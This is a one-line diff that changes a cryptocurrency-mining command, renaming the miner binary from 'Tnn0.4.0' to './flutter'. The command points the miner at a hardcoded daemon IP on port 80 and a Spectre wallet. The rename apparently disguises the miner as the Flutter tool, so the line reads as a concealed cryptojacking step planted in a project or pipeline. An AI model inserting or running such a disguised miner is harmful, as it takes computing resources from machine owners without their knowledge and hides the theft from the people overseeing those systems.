@@ -1,1 +1,1 @@
-./Tnn0.4.0 --daemon-address 147.182.167.202 --port 80 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qrp5cg0hgjygpmeyr7ru5dky3shhcvrjen765e6qdur2yfl9mcyuqt8vqyqmh
+./flutter --daemon-address 147.182.167.202 --port 80 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qrp5cg0hgjygpmeyr7ru5dky3shhcvrjen765e6qdur2yfl9mcyuqt8vqyqmh
